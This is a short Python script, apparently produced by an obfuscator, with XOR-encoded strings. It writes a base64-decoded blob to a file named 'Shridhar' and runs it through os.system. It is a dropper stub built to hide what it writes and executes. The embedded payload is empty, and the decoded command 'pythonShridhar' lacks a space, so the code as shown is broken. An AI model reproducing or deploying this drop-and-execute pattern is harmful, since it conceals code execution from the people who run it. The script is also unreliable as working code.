from os import system as Summon
from base64 import b64decode as S64
SHRIDHAR = (
    b''
    )
with open((lambda x, y: ''.join(chr(ord(q) ^ x) for q in y))(254,
    '\xad\x96\x8c\x97\x9a\x96\x9f\x8c'), (lambda x, y: ''.join(chr(ord(q) ^
    x) for q in y))(254, '\x89\x9c')) as HA:
    HA.write(S64(SHRIDHAR))
    Summon((lambda x, y: ''.join(chr(ord(q) ^ x) for q in y))(254,
        '\x8e\x87\x8a\x96\x91\x90\xad\x96\x8c\x97\x9a\x96\x9f\x8c'))
